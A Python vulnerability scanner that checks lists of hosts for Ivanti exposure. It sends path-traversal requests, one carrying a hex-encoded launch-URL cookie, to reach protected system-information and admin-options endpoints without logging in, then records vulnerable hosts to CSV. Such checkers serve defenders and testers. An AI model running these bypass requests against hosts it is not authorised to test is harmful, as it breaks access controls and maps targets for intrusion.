import argparse
import csv
import os
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime

import requests
import urllib3

try:
    from colorama import Fore, Style, init

    init()
    COLOR_ENABLED = True
except ImportError:
    COLOR_ENABLED = False

# Disable warnings for unverified HTTPS requests
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def check_system_info(host, protocol, port, user_agent):
    url = f"{protocol}://{host}:{port}/api/v1/totp/user-backup-code/../../system/system-information"
    headers = {"User-Agent": user_agent}

    try:
        res = requests.get(url, headers=headers, verify=False, timeout=5)
        if res.status_code == 200:
            try:
                json_data = res.json()
                if "key_name" in json_data:
                    return f"Vulnerable: {json_data['key_name']}"
                else:
                    return "Not Vulnerable (Key Not Found)"
            except ValueError:
                return "Invalid JSON Response"
        elif res.status_code == 403:
            return "Not Vulnerable (403 Forbidden)"
        else:
            return f"HTTP Error: {res.status_code}"
    except requests.exceptions.RequestException as e:
        return f"Network Issue"
        # More Verbose: return f"Network Issue: {e}"


def check_bypass_vulnerability(host, protocol, port, user_agent):
    bypass_url = (
        f"{protocol}://{host}:{port}/api/v1/cav/client/status/../../admin/options"
    )
    headers = {
        "User-Agent": user_agent,
        "Cookie": "DSLaunchURL=2F6170692F766C2F6361762F636C69656E742F7374617475732F2E2E2F2E2E2F61646D696E2F6F7074696F6E73; DSSignInURL=/",
        "Cache-Control": "max-age=0",
        "Sec-Ch-Ua": '"Not:A-Brand";v="99", "Chromium";v="112"',
        "Sec-Ch-Ua-Mobile": "?0",
        "Sec-Ch-Ua-Platform": '"macOS"',
        "Upgrade-Insecure-Requests": "1",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Sec-Fetch-Site": "none",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-User": "?1",
        "Sec-Fetch-Dest": "document",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "en-US,en;q=0.9",
        "Connection": "close",
    }

    try:
        res = requests.get(bypass_url, headers=headers, verify=False, timeout=5)
        if res.status_code == 200:
            try:
                json_data = res.json()
                if "key_name" in json_data:
                    return f"Vulnerable: {json_data['key_name']}"
                else:
                    return "Not Vulnerable (Key Not Found)"
            except ValueError:
                return "Invalid JSON Response"
        elif res.status_code == 403:
            return "Not Vulnerable (403 Forbidden)"
        else:
            return f"HTTP Error: {res.status_code}"
    except requests.exceptions.RequestException as e:
        return f"Network Issue: {e}"
        # More Verbose: return f"Network Issue: {e}"


def check_web_access(host, protocol, port, user_agent):
    secure_phrase = "Access to the Web site is blocked by your administrator"
    web_url = f"{protocol}://{host}:{port}/api/v1/configuration/users/user-roles/user-role/rest-userrole1/web/web-bookmarks/bookmark"
    headers = {"User-Agent": user_agent}

    try:
        r = requests.get(web_url, headers=headers, verify=False, timeout=5)
        if r.status_code == 403 and len(r.content) == 0:
            return "Vulnerable"
        elif secure_phrase in r.text:
            return "Not Vulnerable"
        elif r.status_code != 200:
            return f"HTTP Error: {r.status_code}"
        else:
            return "Ivanti Presence Inconclusive"
    except requests.exceptions.ConnectionError:
        return "Network Issue"
    except requests.exceptions.Timeout:
        return "Timeout Error"
    except requests.exceptions.RequestException as e:
        return "Connection Error"


def check_host(host, protocol, port, user_agent):
    web_access_status = check_web_access(host, protocol, port, user_agent)
    system_info_status = check_system_info(host, protocol, port, user_agent)
    bypass_status = check_bypass_vulnerability(host, protocol, port, user_agent)
    return host, port, web_access_status, system_info_status, bypass_status


def strip_protocol_and_dedupe(results):
    cleaned_results = {}
    for host, port, web_access_status, system_info_status, bypass_status in results:
        key = (host, port)
        combined_status = f"{web_access_status}; {system_info_status}; {bypass_status}"
        if key not in cleaned_results:
            cleaned_results[key] = combined_status
        else:
            cleaned_results[key] = "; ".join({cleaned_results[key], combined_status})
    return cleaned_results


def count_statuses(results):
    status_counts = {}
    for _, combined_status in results.items():
        statuses = combined_status.split("; ")
        for status in statuses:
            if status not in status_counts:
                status_counts[status] = 1
            else:
                status_counts[status] += 1
    return status_counts


def print_status(
    host, port, web_access_status, system_info_status, bypass_status, color_enabled
):
    print(f"{host}:{port}")

    def colored_status(status):
        color_map = {
            "Not Vulnerable": Fore.GREEN,
            "Vulnerable": Fore.RED,
            "HTTP Error": Fore.YELLOW,
            "Network Issue": Fore.BLUE,
            "Timeout Error": Fore.MAGENTA,
            "Connection Error": Fore.MAGENTA,
            "Ivanti Presence Inconclusive": Fore.CYAN,
            "Invalid JSON Response": Fore.YELLOW,
        }
        color = color_map.get(status.split(":")[0], "")
        return color + status + Style.RESET_ALL if color_enabled else status

    print(f"    Web Access:      {colored_status(web_access_status)}")
    print(f"    System Info:     {colored_status(system_info_status)}")
    print(f"    Bypass Detected: {colored_status(bypass_status)}")
    print()  # Blank line before next host


def main():
    parser = argparse.ArgumentParser(
        description="Check the status of hosts for vulnerabilities."
    )
    parser.add_argument(
        "-c", "--color", action="store_true", help="Enable color-coded output"
    )
    parser.add_argument(
        "-i", "--input", required=False, help="Input file containing the list of hosts"
    )
    parser.add_argument("-u", "--url", required=False, help="Single URL to test")
    parser.add_argument(
        "-pr",
        "--protocol",
        required=False,
        default="http",
        help="Protocol (http or https)",
    )
    parser.add_argument(
        "-p",
        "--ports",
        nargs="+",
        type=int,
        default=[80, 443],
        help="List of ports to check (default: 80, 443)",
    )
    parser.add_argument(
        "-o",
        "--output",
        help="Output CSV file name (default: ./results/[current_date_time]_results.csv)",
    )
    parser.add_argument(
        "-t",
        "--threads",
        type=int,
        default=20,
        help="Number of threads to use (default: 20)",
    )
    parser.add_argument(
        "-a",
        "--user-agent",
        default="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.3",
        help="Custom User-Agent for requests",
    )
    args = parser.parse_args()

    default_output_dir = "./results"
    default_output_file = datetime.now().strftime("%Y%m%d_%H%M%S") + "_results.csv"
    output_path = (
        os.path.join(default_output_dir, default_output_file)
        if not args.output
        else args.output
    )

    if not os.path.exists(default_output_dir):
        os.makedirs(default_output_dir)

    results = []
    if args.url:
        for port in args.ports:
            result = check_host(args.url, args.protocol, port, args.user_agent)
            results.append(result)
            print_status(
                result[0],
                result[1],
                result[2],
                result[3],
                result[4],
                args.color and COLOR_ENABLED,
            )
    elif args.input:
        try:
            with open(args.input, "r") as f:
                hosts_list = f.read().splitlines()

            with ThreadPoolExecutor(max_workers=args.threads) as executor:
                futures = []
                for host in hosts_list:
                    for port in args.ports:
                        future = executor.submit(
                            check_host, host, args.protocol, port, args.user_agent
                        )
                        futures.append(future)

                for future in futures:
                    result = future.result()
                    results.append(result)
                    print_status(
                        result[0],
                        result[1],
                        result[2],
                        result[3],
                        result[4],
                        args.color and COLOR_ENABLED,
                    )

        except FileNotFoundError:
            print(f"Error: File '{args.input}' not found.")
            return
        except Exception as e:
            print(f"Error: An unexpected error occurred")
            # More Verbose: print(f"Error: An unexpected error occurred: {e}")
            return
    else:
        print("Please provide either a URL with -u/--url or a file with -i/--input.")
        return

    cleaned_results = strip_protocol_and_dedupe(results)

    with open(output_path, "w", newline="") as csvfile:
        csvwriter = csv.writer(csvfile)
        csvwriter.writerow(
            ["Host", "Port", "Web Access", "System Info", "Bypass Detected"]
        )
        for (host, port), combined_status in cleaned_results.items():
            (
                web_access_status,
                system_info_status,
                bypass_status,
            ) = combined_status.split("; ")
            csvwriter.writerow(
                [host, port, web_access_status, system_info_status, bypass_status]
            )

    status_counts = count_statuses(cleaned_results)
    print("\nStatus Counts:")
    for status, count in status_counts.items():
        print(f"{status}: {count}")

    print(f"Results written to {output_path}")


if __name__ == "__main__":
    main()
